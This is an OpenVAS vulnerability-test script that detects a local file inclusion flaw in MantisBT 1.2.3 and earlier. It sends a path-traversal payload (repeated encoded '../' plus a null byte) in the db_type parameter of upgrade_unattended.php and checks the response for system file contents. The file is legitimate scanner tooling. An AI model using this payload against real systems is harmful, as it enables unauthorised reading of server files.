###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mantis_lfi.nasl 14 2013-10-27 12:33:37Z jan $
#
# MantisBT <=1.2.3 (db_type) Local File Inclusion Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Mantis is prone to a local file-include vulnerability because it fails
to properly sanitize user supplied input. Input passed thru the
'db_type' parameter (GET & POST) to upgrade_unattended.php script is
not properly verified before being used to include files.

Mantis is also prone to a cross-site scripting
attack.";


if (description)
{
 script_id(100947);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-12-15 13:36:34 +0100 (Wed, 15 Dec 2010)");
 script_bugtraq_id(45399);
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_name("MantisBT <=1.2.3 (db_type) Local File Inclusion Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4984.php");
 script_xref(name : "URL" , value : "http://www.mantisbt.org/bugs/view.php?id=12607");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if installed Mantis is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("mantis_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!get_port_state(port)){
    exit(0);
}

if(!can_host_php(port:port))exit(0);
if(!dir = get_dir_from_kb(port:port,app:"mantis"))exit(0);
files = traversal_files();

foreach file (keys(files)) {
   
  url = string(dir,"/admin/upgrade_unattended.php?db_type=",crap(data:"..%2f",length:5*15),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);


   
